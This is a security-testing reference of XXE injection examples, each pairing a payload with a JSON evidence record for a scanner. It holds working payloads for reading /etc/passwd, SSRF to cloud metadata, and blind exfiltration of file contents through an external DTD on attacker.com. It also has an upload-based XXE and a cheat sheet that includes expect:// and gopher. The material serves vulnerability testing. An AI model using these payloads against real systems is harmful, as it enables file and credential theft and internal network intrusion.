# XML External Entity (XXE) Injection Examples

This file contains XXE examples with evidence patterns for file disclosure, SSRF, blind XXE, DoS, and parser-specific attacks.

## Table of Contents
1. [Classic XXE - File Disclosure](#classic-xxe---file-disclosure)
2. [SSRF via XXE](#ssrf-via-xxe)
3. [Blind XXE - Out-of-Band](#blind-xxe---out-of-band)
4. [Error-Based XXE](#error-based-xxe)
5. [XInclude Attacks](#xinclude-attacks)
6. [SVG/File Upload XXE](#svgfile-upload-xxe)
7. [Denial of Service](#denial-of-service)
8. [Test Result Types](#test-result-types)
9. [Common Payloads Reference](#common-payloads-reference)

---

## Classic XXE - File Disclosure

### Example 1: Basic File Disclosure (Linux)

**Scenario:** SOAP API parses XML without disabling external entities.

**Vulnerability:**
```java
// Java - VULNERABLE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(xmlInput); // XXE enabled by default!
```

**Test:**
1. Baseline: Send well-formed XML without entities
2. Payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```
3. Detection: Response contains file contents

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_file_disclosure",
  "cwe": "CWE-611",
  "test": {
    "url": "http://target.com/api/parse",
    "method": "POST",
    "content_type": "application/xml",
    "status": 200,
    "response_snippet": "<result>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1...</result>",
    "response_hash": "sha256:abc..."
  },
  "evidence": "XXE file disclosure: /etc/passwd contents returned",
  "payload_used": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
}
```

---

### Example 2: Windows File Disclosure

**Scenario:** .NET application with XmlDocument using default settings.

**Vulnerability:**
```csharp
// C# - VULNERABLE
XmlDocument doc = new XmlDocument();
doc.Load(xmlStream); // XmlResolver enabled by default
```

**Test:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_file_disclosure_windows",
  "cwe": "CWE-611",
  "test": {
    "url": "http://target.com/api/import",
    "response_snippet": "[fonts]\n[extensions]\n[mci extensions]..."
  },
  "evidence": "XXE file disclosure: C:\\windows\\win.ini contents returned",
  "payload_used": "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">"
}
```

---

## SSRF via XXE

### Example 3: Cloud Metadata Access

**Scenario:** XXE used to access AWS metadata endpoint from server.

**Test:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_ssrf_metadata",
  "cwe": ["CWE-611", "CWE-918"],
  "test": {
    "url": "http://target.com/api/xml",
    "response_snippet": "ec2-instance-role"
  },
  "evidence": "SSRF via XXE: AWS IAM role name disclosed",
  "payload_used": "<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">"
}
```

---

### Example 4: Internal Network Scanning

**Scenario:** XXE used to probe internal services.

**Test:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_ssrf_internal",
  "cwe": ["CWE-611", "CWE-918"],
  "test": {
    "url": "http://target.com/api/xml",
    "response_snippet": "<html><title>Admin Panel</title>..."
  },
  "evidence": "SSRF via XXE: internal admin panel accessed at 192.168.1.1:8080",
  "payload_used": "<!ENTITY xxe SYSTEM \"http://192.168.1.1:8080/admin\">"
}
```

---

## Blind XXE - Out-of-Band

### Example 5: Blind XXE with External DTD

**Scenario:** Application parses XML but doesn't reflect entity content.

**Attack Setup:**
1. Host external DTD on attacker server
2. DTD exfiltrates file contents via HTTP request

**evil.dtd (hosted at http://attacker.com/evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/collect?data=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_blind_oob",
  "cwe": "CWE-611",
  "test": {
    "url": "http://target.com/api/parse",
    "status": 200
  },
  "callback": {
    "received": true,
    "timestamp": "2025-01-19T15:30:00Z",
    "source_ip": "10.0.1.50",
    "request_path": "/collect?data=webserver-prod-01"
  },
  "evidence": "Blind XXE: hostname exfiltrated via OOB callback",
  "payload_used": "External DTD with parameter entity exfiltration"
}
```

---

### Example 6: DNS-Based Blind XXE

**Scenario:** HTTP callbacks blocked but DNS allowed.

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://xxe-test.attacker.com/probe">
  %xxe;
]>
<foo>test</foo>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_blind_dns",
  "cwe": "CWE-611",
  "callback": {
    "type": "DNS",
    "received": true,
    "query": "xxe-test.attacker.com",
    "source_ip": "10.0.1.50"
  },
  "evidence": "Blind XXE: DNS callback received from target server",
  "payload_used": "<!ENTITY % xxe SYSTEM \"http://xxe-test.attacker.com/probe\">"
}
```

---

## Error-Based XXE

### Example 7: File Contents in Error Message

**Scenario:** Parser error messages reveal file contents.

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_error_based",
  "cwe": "CWE-611",
  "test": {
    "url": "http://target.com/api/parse",
    "status": 500,
    "response_snippet": "java.io.FileNotFoundException: /nonexistent/webserver-prod-01 (No such file)"
  },
  "evidence": "Error-based XXE: hostname 'webserver-prod-01' leaked in error message",
  "payload_used": "Parameter entity referencing nonexistent file with %file; content"
}
```

---

## XInclude Attacks

### Example 8: XInclude When DOCTYPE Blocked

**Scenario:** Application blocks DOCTYPE but processes XInclude.

**Payload:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_xinclude",
  "cwe": "CWE-611",
  "test": {
    "url": "http://target.com/api/xml",
    "response_snippet": "root:x:0:0:root:/root:/bin/bash..."
  },
  "evidence": "XInclude XXE: /etc/passwd disclosed despite DOCTYPE being blocked",
  "payload_used": "<xi:include parse=\"text\" href=\"file:///etc/passwd\"/>"
}
```

---

## SVG/File Upload XXE

### Example 9: XXE via SVG Upload

**Scenario:** Image upload accepts SVG and parses it server-side.

**Payload (malicious.svg):**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text x="0" y="16" font-size="16">&xxe;</text>
</svg>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_svg_upload",
  "cwe": "CWE-611",
  "test": {
    "url": "http://target.com/upload",
    "method": "POST",
    "content_type": "multipart/form-data",
    "filename": "malicious.svg"
  },
  "rendered_output": "root:x:0:0:root:/root:/bin/bash...",
  "evidence": "SVG XXE: file contents embedded in rendered image text",
  "payload_used": "SVG with external entity in text element"
}
```

---

### Example 10: XXE via Office Document

**Scenario:** Document upload parses DOCX/XLSX XML internally.

**Attack Steps:**
1. Create legitimate DOCX
2. Unzip and modify `word/document.xml` or `[Content_Types].xml`
3. Inject XXE payload
4. Rezip and upload

**Modified document.xml:**
```xml
<?xml version="1.0"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_office_document",
  "cwe": "CWE-611",
  "test": {
    "url": "http://target.com/import/document",
    "filename": "malicious.docx"
  },
  "evidence": "Office document XXE: /etc/passwd disclosed via DOCX parsing",
  "payload_used": "Modified document.xml with external entity"
}
```

---

## Denial of Service

### Example 11: Billion Laughs Attack (CWE-776)

**Scenario:** Exponential entity expansion causes memory exhaustion.

**Payload (MINIMAL - for detection only):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "xxe_dos_billion_laughs",
  "cwe": ["CWE-611", "CWE-776"],
  "test": {
    "url": "http://target.com/api/parse",
    "baseline_response_time_ms": 50,
    "payload_response_time_ms": 5000,
    "status": 500
  },
  "evidence": "DoS via entity expansion: 100x response time increase",
  "payload_used": "Minimal recursive entity expansion (3 levels)"
}
```

**WARNING:** Only use minimal payloads; abort immediately if server impact detected.

---

## Test Result Types

### FALSE_POSITIVE (Properly Secured)

**Scenario:** Application disables external entities.

```json
{
  "status": "FALSE_POSITIVE",
  "injection_type": "xxe",
  "test": {
    "payload": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
    "response_snippet": "External entities are disabled"
  },
  "evidence": "XXE mitigated: DTD/external entities disabled"
}
```

### UNVALIDATED (WAF Blocking)

```json
{
  "status": "UNVALIDATED",
  "injection_type": "xxe",
  "reason": "WAF blocking XML with DOCTYPE",
  "test": {
    "status": 403,
    "response_snippet": "Request blocked: XML injection detected"
  },
  "evidence": "Cannot validate - WAF blocks DOCTYPE declarations"
}
```

### PARTIAL (Limited Exploitation)

```json
{
  "status": "PARTIAL",
  "injection_type": "xxe",
  "tests": {
    "file_disclosure": {"status": "blocked", "note": "file:// protocol disabled"},
    "http_ssrf": {"status": "allowed", "note": "http:// entities processed"}
  },
  "evidence": "Partial XXE: HTTP entities allowed but file:// blocked",
  "requires_manual_review": true
}
```

---

## Common Payloads Reference

### File Disclosure Payloads

**Linux:**
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/version">
```

**Windows:**
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">
<!ENTITY xxe SYSTEM "file:///c:/boot.ini">
```

### SSRF Payloads

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
<!ENTITY xxe SYSTEM "http://[::1]:8080/">
```

### Blind XXE External DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

### XInclude Payloads

```xml
<xi:include parse="text" href="file:///etc/passwd"/>
<xi:include parse="text" href="http://attacker.com/callback"/>
```

### Protocol Variations

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "gopher://localhost:6379/_INFO">
```

---

## CWE Reference

| CWE | Name | DAST Testable |
|-----|------|---------------|
| CWE-611 | XML External Entity Reference | Yes |
| CWE-776 | Recursive Entity References (DoS) | Yes |
| CWE-827 | Improper Control of DTD | Yes |
| CWE-918 | Server-Side Request Forgery | Yes (via XXE) |
| CWE-610 | Externally Controlled Reference (parent) | Yes |

**Related Attack Patterns:**
- CAPEC-221: Data Serialization External Entities Blowup
- CAPEC-201: Serialized Data External Linking
